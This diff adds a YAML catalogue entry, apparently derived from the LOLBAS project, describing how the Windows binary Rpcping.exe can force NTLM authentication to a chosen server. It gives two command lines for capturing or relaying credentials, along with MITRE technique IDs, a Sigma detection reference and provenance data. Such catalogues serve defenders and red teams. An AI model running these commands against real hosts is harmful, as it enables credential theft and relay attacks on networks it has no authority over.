@@ -1,0 +1,99 @@
+id: lolbas/T1NCaW5hcmllcy9ScGNwaW5nLnltbA/Q3JlZGVudGlhbHM/1
+type: binary
+platform: windows
+name: Rpcping.exe
+phases:
+- credential-access
+capabilities:
+- credential-access
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1187
+opsec:
+  noise: medium
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_rpcping_credential_capture.yml
+commands:
+- template: rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
+  comment: Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged
+    resource (Sign not Set).
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Rpcping/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Rpcping.exe
+      category: Credentials
+      privileges: User
+      mitre_id: T1187
+      source_file: OSBinaries/Rpcping.yml
+      command_source_index: 1
+      document_utf8: "---\nName: Rpcping.exe\nDescription: Used to verify rpc connection\nAuthor: Oddvar\
+        \ Moe\nCreated: 2018-05-25\nCommands:\n  - Command: rpcping -s 127.0.0.1 -e 1234 -a privacy -u\
+        \ NTLM\n    Description: Send a RPC test connection to the target server (-s) and force the NTLM\
+        \ hash to be sent in the process.\n    Usecase: Capture credentials on a non-standard port\n \
+        \   Category: Credentials\n    Privileges: User\n    MitreID: T1003\n    OperatingSystem: Windows\
+        \ vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n  - Command: rpcping /s 10.0.0.35\
+        \ /e 9997 /a connect /u NTLM\n    Description: Trigger an authenticated RPC call to the target\
+        \ server (/s) that could be relayed to a privileged resource (Sign not Set).\n    Usecase: Relay\
+        \ a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port\n    Category: Credentials\n\
+        \    Privileges: User\n    MitreID: T1187\n    OperatingSystem: Windows vista, Windows 7, Windows\
+        \ 8, Windows 8.1, Windows 10, Windows 11\nFull_Path:\n  - Path: C:\\Windows\\System32\\rpcping.exe\n\
+        \  - Path: C:\\Windows\\SysWOW64\\rpcping.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_rpcping_credential_capture.yml\n\
+        Resources:\n  - Link: https://github.com/vysec/RedTips\n  - Link: https://twitter.com/vysecurity/status/974806438316072960\n\
+        \  - Link: https://twitter.com/vysecurity/status/873181705024266241\n  - Link: https://twitter.com/splinter_code/status/1421144623678988298\n\
+        Acknowledgement:\n  - Person: Casey Smith\n    Handle: '@subtee'\n  - Person: Vincent Yiu\n  \
+        \  Handle: '@vysecurity'\n  - Person: Antonio Cocomazzi\n    Handle: '@splinter_code'\n  - Person:\
+        \ ap\n    Handle: '@decoder_it'\n"
+      document_sha256: sha256:f1f944b5ee6435065dd3d1117cdbb86102b4ba70b12ec7a26832cb6226840cba
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Rpcping/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: credential-access
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: credential-access
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1187
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:4886a24f208169e9da3508845730c2477c43938bf9a8a1ebc3f7f6a35b1e268c
